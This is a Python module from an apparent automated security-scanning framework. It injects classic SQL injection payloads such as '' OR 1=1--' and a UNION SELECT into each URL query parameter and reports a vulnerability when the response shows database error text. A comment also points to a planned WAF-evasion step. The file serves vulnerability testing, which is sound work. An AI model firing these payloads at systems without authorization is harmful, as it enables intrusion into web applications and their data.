from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, ResultPacket, Vulnerability
import aiohttp
import time
import urllib.parse

class SQLInjectionProbe(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "SQL Injection Probe"

    async def execute(self, packet: JobPacket) -> ResultPacket:
        start_time = time.time()
        vulnerabilities = []
        
        payloads = ["' OR 1=1--", "admin' #", "' UNION SELECT 1,2,3--"]
        
        # Simple Logic: Append payload to query params
        # ?id=1 -> ?id=1' OR 1=1--
        
        if "?" in packet.target.url:
            base_url, query = packet.target.url.split("?", 1)
            params = urllib.parse.parse_qs(query)
            
            for param, values in params.items():
                for payload in payloads:
                    # Construct attack URL
                    attack_params = params.copy()
                    attack_params[param] = [values[0] + payload]
                    attack_query = urllib.parse.urlencode(attack_params, doseq=True)
                    attack_url = f"{base_url}?{attack_query}"
                    
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(attack_url) as response:
                                text = await response.text()
                                if "sql" in text.lower() or "syntax" in text.lower():
                                    vulnerabilities.append(Vulnerability(
                                        name="SQL Injection",
                                        severity="CRITICAL",
                                        description=f"Database error triggered in parameter '{param}'.",
                                        evidence=f"Payload: {payload}, Response contains SQL error.",
                                        remediation="Use parameterized queries (Prepared Statements)."
                                    ))
                                    break # Stop after finding one for this param
                    except Exception:
                        pass
        
        waf_detected = False # Placeholder for future WAF detection logic
        status = "SUCCESS"
        next_step = None
        
        if vulnerabilities:
            status = "VULN_FOUND"
        elif waf_detected:
            status = "BLOCKED"
            next_step = "SIGMA_EVASION" # Signal Beta to call Sigma
            
        return ResultPacket(
            job_id=packet.id if hasattr(packet, 'id') else "unknown",
            source_agent="SQLInjectionProbe",
            status=status,
            vulnerabilities=vulnerabilities,
            execution_time_ms=(time.time() - start_time) * 1000,
            data={"next_step": next_step} if next_step else {}
        )
